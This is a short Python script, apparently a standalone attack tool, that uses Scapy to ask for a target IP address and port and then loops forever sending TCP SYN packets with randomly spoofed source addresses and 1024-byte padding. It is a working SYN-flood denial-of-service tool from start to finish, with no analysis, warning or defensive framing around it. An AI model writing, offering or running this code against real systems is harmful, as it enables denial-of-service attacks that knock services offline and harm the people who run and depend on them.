from scapy.all import *
import random
import time

target_ip = input("ip: ")

target_port = input('port: ')

target_port = int(target_port)

while True:
 if target_port and target_ip:

    source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

    ip = IP(".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)

    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

    raw = Raw(b"X"*1024)

    p = ip / tcp / raw
   
    send(p, loop=1, verbose=0)
   
    
